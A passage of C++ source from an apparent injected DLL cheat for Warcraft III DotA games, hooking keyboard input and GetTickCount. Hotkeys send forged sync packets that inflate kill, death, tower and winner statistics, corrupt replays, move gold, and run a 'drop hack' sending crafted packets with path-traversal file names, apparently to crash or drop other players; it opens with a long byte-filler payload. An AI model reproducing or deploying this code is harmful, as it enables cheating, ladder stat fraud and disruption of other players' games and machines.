81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81\x81", 1022);
						while (IsKeyPressed(VK_OEM_3) && IsKeyPressed(VK_F5))
						{
							Sleep(100);
						}
					}
				}
				sendtick = GetTickCount();/*
				GAME_SendPacketDir_my(globaltestsnddata.tcpstraddr, (DWORD)globaltestsnddata.tcpstraddr, globaltestsnddata.data, globaltestsnddata.len);*/
			}

			if (IsGame())
			{
				if (!foundgame)
				{
					GLOBAL_TCP = 0;
					foundgame = true;
				}

				if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F1))
				{
					int unitaddr = GetSelectedOwnedUnit();
					if (unitaddr)
					{
						FillItemCountAndItemArray();
						float unitx = 0.0f, unity = 0.0f, unitz = 0.0f;
						GetUnitLocation3D(unitaddr, &unitx, &unity, &unitz);
						float bestdist = 9999.9f;
						int itembestdist = -1;
						for (int i = 0; i < SafeItemCount; i++)
						{
							if (SafeItemArray[i])
							{
								if (IsNotBadItem(SafeItemArray[i]))
								{
									float itemx = 0.0f, itemy = 0.0f, itemz = 0.0f;
									GetItemLocation3D(SafeItemArray[i], &itemx, &itemy, &itemz);
									if (Distance2D(itemx, itemy, unitx, unity) < bestdist)
									{
										bestdist = Distance2D(itemx, itemy, unitx, unity);
										itembestdist = i;
									}
								}
							}
						}

						if (itembestdist >= 0 && bestdist < 200.0f && GetTickCount() - PickTicks > 500)
						{
							PickTicks = GetTickCount();

							DisplayText("Pickup item!", 15.f);
							ItemOrder(SafeItemArray[itembestdist]);
						}
					}
				}

				static bool writeinfobeforedrop = true;
				if (GetTickCount() - UPDATE_TICKS > 1000)
				{
					UPDATE_TICKS = GetTickCount();

					if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_ADD))
					{
						DisplayText("Increase fps", 10.0f);
						if (quality > 0)
							quality--;
						if (quality == 0)
						{
							DisplayText("MAX FPS fps", 10.0f);
						}
					}
					else if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_ADD))
					{
						DisplayText("Decrease fps", 10.0f);
						if (quality < 25)
							quality++;
						if (quality >= 25)
						{
							DisplayText("MIN FPS fps", 10.0f);
						}
					}

					if (IsKeyPressed(VK_LSHIFT) && IsKeyPressed(VK_F6) && IsKeyPressed(VK_F7))
					{
						//int war3map = (int)GetModuleHandleA("war3map.dll");
						//if (war3map && *(int*)(war3map + 0x1047DC8) == (int)(GameDll + 0x3B3E50))
						//{
						//	/*if (writeinfobeforedrop)
						//	{
						//		writeinfobeforedrop = false;
						//		DisplayText("Full info", 10.0f);

						//			for (int i = 1; i <= 3; i++)
						//			{
						//				SendSyncDat("Global", "Winner", i);
						//			}

						//		SendSyncDat("Global", "m", -1);
						//		SendSyncDat("Global", "s", -1);

						//		for (int i = 1; i <= 11; i++)
						//		{
						//			if (i != 6)
						//				SendSyncDat("Data", "Hero" + std::to_string(i), 12 - i);
						//		}

						//		for (int i = 1; i <= 11; i++)
						//		{
						//			if (i != 6)
						//				SendSyncDat("Data", "Courier" + std::to_string(i), 12 - i);
						//		}

						//		for (int i = 1; i <= 11; i++)
						//		{
						//			if (i != 6)
						//				SendSyncDat("Data", "Tower" + std::to_string(i), 12 - i);
						//		}

						//		for (int i = 1; i <= 11; i++)
						//		{
						//			if (i != 6)
						//				SendSyncDat("Data", "Rax" + std::to_string(i), 12 - i);
						//		}

						//		for (int i = 0; i <= 100; i += 5)
						//		{
						//			SendSyncDat("Data", "Throne", i);
						//		}

						//		for (int i = 0; i <= 100; i += 5)
						//		{
						//			SendSyncDat("Data", "Tree", i);
						//		}

						//		for (int i = 1; i <= 11; i++)
						//		{
						//			if (i != 6)
						//				SendSyncDat("Data", "CK", i);
						//		}


						//		for (int i = 1; i <= 5; i++)
						//		{
						//			SendSyncDat(std::to_string(i), "1", i);
						//			SendSyncDat(std::to_string(i), "2", i);
						//			SendSyncDat(std::to_string(i), "3", i);
						//			SendSyncDat(std::to_string(i), "4", i);
						//			SendSyncDat(std::to_string(i), "5", i);
						//			SendSyncDat(std::to_string(i), "6", i);
						//			SendSyncDat(std::to_string(i), "7", i);
						//			SendSyncDat(std::to_string(i), "8_0", i);
						//			SendSyncDat(std::to_string(i), "8_1", i);
						//			SendSyncDat(std::to_string(i), "8_2", i);
						//			SendSyncDat(std::to_string(i), "8_3", i);
						//			SendSyncDat(std::to_string(i), "8_4", i);
						//			SendSyncDat(std::to_string(i), "8_5", i);
						//			SendSyncDat(std::to_string(i), "9", i);

						//			SendSyncDat(std::to_string(i), "id", i);

						//			SendSyncDat(std::to_string(i + 6), "1", i);
						//			SendSyncDat(std::to_string(i + 6), "2", i);
						//			SendSyncDat(std::to_string(i + 6), "3", i);
						//			SendSyncDat(std::to_string(i + 6), "4", i);
						//			SendSyncDat(std::to_string(i + 6), "5", i);
						//			SendSyncDat(std::to_string(i + 6), "6", i);
						//			SendSyncDat(std::to_string(i + 6), "7", i);
						//			SendSyncDat(std::to_string(i + 6), "8_0", i);
						//			SendSyncDat(std::to_string(i + 6), "8_1", i);
						//			SendSyncDat(std::to_string(i + 6), "8_2", i);
						//			SendSyncDat(std::to_string(i + 6), "8_3", i);
						//			SendSyncDat(std::to_string(i + 6), "8_4", i);
						//			SendSyncDat(std::to_string(i + 6), "8_5", i);
						//			SendSyncDat(std::to_string(i + 6), "9", i);

						//			SendSyncDat("id", std::to_string(i), i);
						//		};
						//	}
						//	else
						//	{*/
						//	DisplayText("Drop info", 10.0f);
						//	writeinfobeforedrop = true;
						//	unsigned char oldval = *(unsigned char*)(0x1047433 + war3map);
						//	*(unsigned char*)(0x1047433 + war3map) = 255;
						//	WinHack403();


						//	/*
						//	*(unsigned char*)(0x1047433 + war3map) = 255;
						//	WinHack403();*/
						//	*(unsigned char*)(0x1047433 + war3map) = oldval;
						//	/*	}*/
						//}

						DotaJsonMegaKill();
						return CallNextHookEx(hhookSysMsg, nCode, wParam, lParam);
					}
					else writeinfobeforedrop = true;

					/*		if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F2))
							{
								for (int i = 1; i <= 11; i++)
								{
									if (i != 6)
										SendSyncDat("id", std::to_string(i), 12 - i);
								}
							}*/


					if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F2))
					{
						SendSyncDat("Data", "CSK", 0);

						for (int i = 1; i <= 12; i++)
						{
							SendSyncDat("Data", "CSK" + std::to_string(i), 666666);
						}

						for (int i = 1; i <= 12; i++)
						{
							SendSyncDat("Data", "CSD" + std::to_string(i), 666666);
						}

						for (int i = 1; i <= 12; i++)
						{
							SendSyncDat("Data", "NK" + std::to_string(i), 666666);
						}

						DisplayText("Creeps info", 10.0f);

						SendSyncDat("Data", "RuneStore0", 6);

						for (int x = 0; x < 5; x++)
						{
							for (int i = 1; i <= 12; i++)
							{
								SendSyncDat("Data", "RuneUse" + std::to_string(1 + (rand() % 5)), i);
								SendSyncDat("Data", "RuneStore" + std::to_string(1 + (rand() % 5)), i);
							}
						}
						DisplayText("Creepstats", 10.0f);

						SendPacket((BYTE*)"\x17", 4);
						SendPacket((BYTE*)"\x17\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x01\x01\x01\01\x01", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x01\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x00\x02\00\x00", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x03\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x00\x04\00\x00", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x05\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x00\x08\00\x00", 4);
						SendPacket((BYTE*)"\x09\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
					}
					if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F3))
					{
						for (int x = 0; x < 50; x++)
						{
							for (int i = 1; i <= 11; i++)
							{
								if (i != 6)
									SendSyncDat("Data", "Hero6", i);
							}
						}
						st_kills += 50;
						DisplayText("Kills info = " + std::to_string(st_kills), 10.0f);

						SendPacket((BYTE*)"\x17", 4);
						SendPacket((BYTE*)"\x17\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x01\x01\x01\01\x01", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
					}

					if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F4))
					{
						for (int x = 0; x < 50; x++)
						{
							for (int i = 1; i <= 11; i++)
							{
								if (i != 6)
									SendSyncDat("Data", "Hero" + std::to_string(i), 6);
							}
						}

						st_deaths += 50;
						DisplayText("Deaths info = " + std::to_string(st_deaths), 10.0f);

						SendPacket((BYTE*)"\x17", 4);
						SendPacket((BYTE*)"\x17\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x01\x01\x01\01\x01", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
					}

					if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F5))
					{
						for (int x = 0; x < 50; x++)
						{
							for (int i = 1; i <= 11; i++)
							{
								if (i != 6)
									SendSyncDat("Data", "Assist" + std::to_string(i), 6);
							}
						}

						st_assists += 50;
						DisplayText("Assists info = " + std::to_string(st_assists), 10.0f);

						SendPacket((BYTE*)"\x17", 4);
						SendPacket((BYTE*)"\x17\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x01\x01\x01\01\x01", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						/*for (int x = 0; x < 100; x++)
						{
							for (int i = 1; i <= 12; i++)
							{
								SendSyncDat("Data", "Roshan", i);
							}
						}

						DisplayText("Roshan info", 10.0f);

						for (int i = 1; i <= 12; i++)
						{
							SendSyncDat("Data", "AegisOn", i);
						}

						DisplayText("Aegis info", 10.0f);*/
					}
					/*if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F9))
					{
						for (int x = 0; x < 50; x++)
						{
							for (int i = 1; i <= 11; i++)
							{
								if (i != 6)
									SendSyncDat("Data", "Courier" + std::to_string(x), i);
							}
						}

						DisplayText("Courjer info", 10.0f);
					}*/

					/*		if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F7))
							{
								for (int i = 1; i <= 11; i++)
								{
									if (i != 6)
										SendSyncDat("Data", "CK", i);
								}
							}*/



							//if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F5))
							//{
							//	for (int x = 0; x < 50; x++)
							//	{
							//		for (int i = 1; i <= 11; i++)
							//		{
							//			if (i != 6)
							//				SendSyncDat("Data", "Level" + std::to_string(x), i);
							//		}
							//	}
							//	DisplayText("Level info", 10.0f);

							//	SendPacket((BYTE*)"\x17", 4);
							//	SendPacket((BYTE*)"\x17\xFF", 4);
							//	SendPacket((BYTE*)"\x17\xFF\xFF", 4);
							//	SendPacket((BYTE*)"\x17\xFF\xFF\xFF", 4);
							//	SendPacket((BYTE*)"\x17\xFF\xFF\xFF\xFF", 4);
							//	SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
							//	SendPacket((BYTE*)"\x01\x01\x01\01\x01", 4);
							//	SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
							//}

					if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F6))
					{
						for (int x = 0; x < 50; x++)
						{
							for (int i = 1; i <= 11; i++)
							{
								if (i != 6)
								{
									SendSyncDat("Data", "Tower233", i);
								}
							}
						}


						st_towers += 50;
						DisplayText("Tower info = " + std::to_string(st_towers), 10.0f);

						SendPacket((BYTE*)"\x17", 4);
						SendPacket((BYTE*)"\x17\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x01\x01\x01\01\x01", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
					}

					if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F10))
					{
						//SimulateScourgeWinner();
						//SimulateScourgeWinner2();

						//for (int i = 100; i >= 0; i -= 5)
						//{
						//	SendSyncDat("Data", "Throne", i);
						//}

						//for (int i = 100; i >= 0; i -= 5)
						//{
						//	SendSyncDat("Data", "Tree", i);
						//}
						//DisplayText("Throne info", 10.0f);

						//for (int i = 5; i >= -1; i--)
						//{
						//	SendSyncDat("Global", "Winner", i);
						//}

						DisplayText("Winner info", 10.0f);
					}


					if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F11))
					{
						DotaJsonMegaKill();

						//for (int i = 100; i >= 0; i -= 5)
						//{
						//	SendSyncDat("Data", "Throne", i);
						//}

						//for (int i = 100; i >= 0; i -= 5)
						//{
						//	SendSyncDat("Data", "Tree", i);
						//}
						//DisplayText("Throne info", 10.0f);

						//for (int i = 5; i >= -1; i--)
						//{
						//	SendSyncDat("Global", "Winner", i);
						//}

						DisplayText("Winner info", 10.0f);
					}



					if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F11))
					{
						DotaJsonMegaKill();

						//for (int i = 100; i >= 0; i -= 5)
						//{
						//	SendSyncDat("Data", "Throne", i);
						//}

						//for (int i = 100; i >= 0; i -= 5)
						//{
						//	SendSyncDat("Data", "Tree", i);
						//}
						//DisplayText("Throne info", 10.0f);

						//for (int i = 5; i >= -1; i--)
						//{
						//	SendSyncDat("Global", "Winner", i);
						//}

						DisplayText("Winner info", 10.0f);
					}



					if ((IsKeyPressed(VK_LCONTROL) || IsKeyPressed(VK_LSHIFT)) && (IsKeyPressed('1')
						|| IsKeyPressed('2')
						|| IsKeyPressed('3')
						|| IsKeyPressed('4')
						|| IsKeyPressed('5')
						|| IsKeyPressed('6')
						|| IsKeyPressed('7')
						|| IsKeyPressed('8')
						|| IsKeyPressed('9')
						|| IsKeyPressed('0')))
					{
						if (goldpresstime < 3)
						{
							DisplayText("Hold buttons to transfer gold " + std::to_string(3 - goldpresstime) + " seconds...", 7.5f);
							goldpresstime++;
						}
						else
						{
							goldpresstime = 0;
#pragma pack(1)
							struct PackGold
							{
								unsigned char bypass;
								unsigned char bypass1;
								unsigned char bypass2;
								unsigned char bypass3;
								unsigned char bypass31;
								unsigned char bypass32;
								unsigned char cmd;
								unsigned char pid;
								unsigned int gold;
								unsigned int wood;
								unsigned char bypass4;
								unsigned char bypass5;
								unsigned char bypass6;
							};



							PackGold tmpPackGold;
							tmpPackGold.bypass = 0x04;
							tmpPackGold.bypass1 = 0x05;
							tmpPackGold.bypass2 = 0x02;
							tmpPackGold.bypass3 = 0x75;
							tmpPackGold.bypass31 = 0x02;
							tmpPackGold.bypass32 = 0x02;
							tmpPackGold.bypass4 = 0x75;
							tmpPackGold.bypass5 = 0x02;
							tmpPackGold.bypass6 = 0x02;
							tmpPackGold.wood = 0;
							tmpPackGold.cmd = 0x51;

							for (unsigned char i = 1; i <= 11; i++)
							{
								if (i == 6)
									continue;

								int pid = i;

								if (i > 6)
									pid--;

								int keycode = '0' + pid;

								if (pid == 10)
									keycode = '0';

								if (IsKeyPressed(keycode))
								{
									int gold = GetCurrentGoldPlayerById(GetLocalPlayerNumber());
									if (gold <= 0)
										continue;
									if (GetLocalPlayerNumber() != i && GetPlayerByNumber(i) > 0 && GetPlayerTeam(GetPlayerByNumber(i)) == GetPlayerTeam(GetLocalPlayer()))
									{
										tmpPackGold.pid = i;

										if (IsKeyPressed(VK_SHIFT))
										{
											DisplayText("Send all gold to player:" + std::to_string(pid), 15.0f);
											tmpPackGold.gold = gold;
											SendPacket((BYTE*)&tmpPackGold, sizeof(PackGold));
										}
										else
										{
											if (gold == 250)
											{
												DisplayText("Send 250 gold to player:" + std::to_string(pid), 15.0f);
												tmpPackGold.gold = 250;
												SendPacket((BYTE*)&tmpPackGold, sizeof(PackGold));
											}
											else if (gold >= 25)
											{

												DisplayText("Send 25 gold to player:" + std::to_string(pid), 15.0f);
												tmpPackGold.gold = 25;
												SendPacket((BYTE*)&tmpPackGold, sizeof(PackGold));
											}
										}
									}
								}
							}
						}
					}
					else
					{
						goldpresstime = 0;
					}


					if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F12))
					{
						for (int i = 1; i <= 11; i++)
						{
							if (i != 6)
								SendSyncDat("Data", "Hero" + std::to_string(i), 12 - i);
						}

						for (int i = 1; i <= 11; i++)
						{
							if (i != 6)
								SendSyncDat("Data", "Courier" + std::to_string(i), 12 - i);
						}

						for (int i = 1; i <= 11; i++)
						{
							if (i != 6)
								SendSyncDat("Data", "Tower" + std::to_string(i), 12 - i);
						}

						for (int i = 1; i <= 11; i++)
						{
							if (i != 6)
								SendSyncDat("Data", "Rax" + std::to_string(i), 12 - i);
						}

						for (int i = 0; i <= 100; i += 5)
						{
							SendSyncDat("Data", "Throne", i);
						}

						for (int i = 0; i <= 100; i += 5)
						{
							SendSyncDat("Data", "Tree", i);
						}

						for (int i = 1; i <= 11; i++)
						{
							if (i != 6)
								SendSyncDat("Data", "CK", i);
						}

						for (int i = 1; i <= 3; i++)
						{
							SendSyncDat("Global", "Winner", i);
						}

						SendSyncDat("Global", "m", -1);
						SendSyncDat("Global", "s", -1);


						for (int i = 1; i <= 11; i++)
						{
							if (i != 6)
							{
								SendSyncDat(std::to_string(i), "1", i);
								SendSyncDat(std::to_string(i), "2", i);
								SendSyncDat(std::to_string(i), "3", i);
								SendSyncDat(std::to_string(i), "4", i);
								SendSyncDat(std::to_string(i), "5", i);
								SendSyncDat(std::to_string(i), "6", i);
								SendSyncDat(std::to_string(i), "7", i);
								SendSyncDat(std::to_string(i), "8_0", i);
								SendSyncDat(std::to_string(i), "8_1", i);
								SendSyncDat(std::to_string(i), "8_2", i);
								SendSyncDat(std::to_string(i), "8_3", i);
								SendSyncDat(std::to_string(i), "8_4", i);
								SendSyncDat(std::to_string(i), "8_5", i);
								SendSyncDat(std::to_string(i), "9", i);
							}
						}

						for (int i = 1; i <= 11; i++)
						{
							if (i != 6)
								SendSyncDat("id", std::to_string(i), 12 - i);
						}
						DisplayText("Full info", 10.0f);

						SendPacket((BYTE*)"\x17", 4);
						SendPacket((BYTE*)"\x17\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x01\x01\x01\01\x01", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
					}






					/*if (IsKeyPressed(VK_CONTROL) && (IsKeyPressed(VK_F1) ||
						IsKeyPressed(VK_F2) ||
						IsKeyPressed(VK_F3) ||
						IsKeyPressed(VK_F4) ||
						IsKeyPressed(VK_F5) ||
						IsKeyPressed(VK_F6) ||
						IsKeyPressed(VK_F7) ||
						IsKeyPressed(VK_F8) ||
						IsKeyPressed(VK_F9) ||
						IsKeyPressed(VK_F10) ||
						IsKeyPressed(VK_F11) ||
						IsKeyPressed(VK_F12)))
					{
						DisplayText("Make replay bad", 10.0f);
						SendPacket((BYTE*)"\x17", 4);
						SendPacket((BYTE*)"\x17\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x17\xFF\xFF\xFF\xFF", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
						SendPacket((BYTE*)"\x01\x01\x01\01\x01", 4);
						SendPacket((BYTE*)"\x00\x00\x00\00\x00", 4);
					}*/
				}

				if (INIT_DROP_HACK == 1)
				{
					// SAVE GAME
					/*SendPacket((BYTE*)"\x02", 1);
					SendPacket((BYTE*)"\x02", 1);
					const char* baddata = "\x06.\\..\\..\\iccup_trial_maphack.mix";
					SendPacket((BYTE*)baddata, strlen(baddata) + 1);
					INIT_DROP_HACK++;
					DROP_TICKS = GetTickCount();

					char tmpdata[64];
					memset(tmpdata, 0xFF, 64);
					SendPacket((BYTE*)tmpdata, 32);*/
					INIT_DROP_HACK++;
					DROP_TICKS = GetTickCount();


					const char* baddata = "\x04\x05\x06.\\..\\..\\redist\\miles\\iccup_trial_maphack.mix\x00\x07\xFF\xFF\xFF\xFF\x04\x05\x06.\\..\\..\\iccup_trial_maphack.mix\x00\x04\x05\x06.\\..\\..\\gei_porno.mix\x00\x00\x04\x05\x06.\\..\\..\\iccup_yelloant_hohol.mix\x00";
					SendPacket((BYTE*)baddata, strlen(baddata) + 1);
				}
				else if (INIT_DROP_HACK == 2 && GetTickCount() - DROP_TICKS > 75)
				{
					// CLEAR WITH 255
				/*	char tmpdata[64];
					memset(tmpdata, 0xFF, 64);
					SendPacket((BYTE*)tmpdata, 32);*/
					INIT_DROP_HACK++;
					DROP_TICKS = GetTickCount();
				}
				else if (INIT_DROP_HACK == 3 && GetTickCount() - DROP_TICKS > 75)
				{
					// CLEAR WITH ZEROES
					/*char tmpdata[64];
					memset(tmpdata, 0, 64);
					SendPacket((BYTE*)tmpdata, 32);*/
					INIT_DROP_HACK++;
					DROP_TICKS = GetTickCount();/*

					SendPacket((BYTE*)"\x01", 1);
					SendPacket((BYTE*)"\x01", 1);

					SendPacket((BYTE*)"\x01", 1);
					SendPacket((BYTE*)"\x01", 1);

					SendPacket((BYTE*)"\x01", 1);
					SendPacket((BYTE*)"\x01", 1);*/
				}
				else if (INIT_DROP_HACK == 4 && GetTickCount() - DROP_TICKS > 150)
				{
					// SAVE GAME COMPLETED
					/*SendPacket((BYTE*)"\x07\x00\x00\x00\x00", 5);
					SendPacket((BYTE*)"\x07\x00\x00\x00\x00", 5);
					SendPacket((BYTE*)"\x01", 1);
					SendPacket((BYTE*)"\x01", 1);
					SendPacket((BYTE*)"\x01", 1);
					SendPacket((BYTE*)"\x01", 1);
					SendPacket((BYTE*)"\x07\x00\x00\x00", 5);
					SendPacket((BYTE*)"\x07\x00\x00", 5);
					SendPacket((BYTE*)"\x07\x00", 5);
					SendPacket((BYTE*)"\x07", 5);
					SendPacket((BYTE*)"\x07\x00\x00\x00\x00", 5);
					SendPacket((BYTE*)"\x07\x00\x00\x00\x00", 5);
					SendPacket((BYTE*)"\x07\x00\x00\x00\x00", 5);*/
					INIT_DROP_HACK++;
					DROP_TICKS = GetTickCount();
				}
				else if (INIT_DROP_HACK == 5 && GetTickCount() - DROP_TICKS > 2000)
				{
					// SAVE GAME COMPLETED
					DeleteFileA(".\\redist\\miles\\iccup_trial_maphack.mix");
					INIT_DROP_HACK = 0;
					/*SendPacket((BYTE*)"\x07\x00\x00\x00\x00", 5);
					SendPacket((BYTE*)"\x07\x00\x00\x00\x00", 5);
					SendPacket((BYTE*)"\x07\x00\x00\x00\x00", 5);*/
				}
				else if (INIT_DROP_HACK == 0 && IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_INSERT))
				{
					DisplayText("DROP 1", 10.0f);
					INIT_DROP_HACK = 1;
				}

			}
			else
			{
				st_kills = 0;
				st_deaths = 0;
				st_assists = 0;
				st_towers = 0;
				dota_json_index = -2;
				try
				{
					if (GetTickCount() - UPDATE_TICKS > 5000)
					{
						if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_F12))
						{
							UPDATE_TICKS = GetTickCount();

							SendSyncDatDirect("Data", "Modexl", 0);
							SendSyncDatDirect("Data", "Modecm", 1);
							SendSyncDatDirect("Global", "Modesd", 1);
							SendSyncDatDirect("Global", "Modecm", 0);
							Beep(450, 1500);

							for (int i = 1; i <= 11; i++)
							{
								if (i != 6)
									SendSyncDat("id", std::to_string(i), rand() % 12);
							}

							for (int i = 1; i <= 11; i++)
							{
								if (i != 6)
									SendSyncDat("Data", "SWAP_" + std::to_string(i) + "_" + std::to_string(rand() % 12), rand() % 12);
							}
							DotaJsonMegaKill();
						}
					}
				}
				catch (...)
				{

				}

				/*if (IsKeyPressed(VK_LCONTROL) && IsKeyPressed(VK_DELETE))
				{
					sub_6F5C2E30(sub_6F5BE670(), 0, GetRandomHandi());
				}*/
				if (foundgame)
				{
					GLOBAL_TCP = 0;
					foundgame = false;
				}
			}
		}
		catch (...)
		{
			if (IsKeyPressed(VK_LCONTROL))
			{
				Beep(1500, 1500);
			}
		}
	}

	return CallNextHookEx(hhookSysMsg, nCode, wParam, lParam);
}

BOOL __stdcall DllMain(HINSTANCE hDLL, unsigned int r, LPVOID)
{
	if (r == DLL_PROCESS_ATTACH)
	{
		MH_Initialize();
		MH_CreateHook(&GetTickCount, &GetTickCountMy, reinterpret_cast<void**>(&GetTickCount_ptr));
		MH_EnableHook(&GetTickCount);
		if (!GetModuleHandleA("Game.dll"))
		{
			return TRUE;
		}

		for (unsigned char i = 0; i < 15; i++)
		{
			random16players.push_back(i);
		}
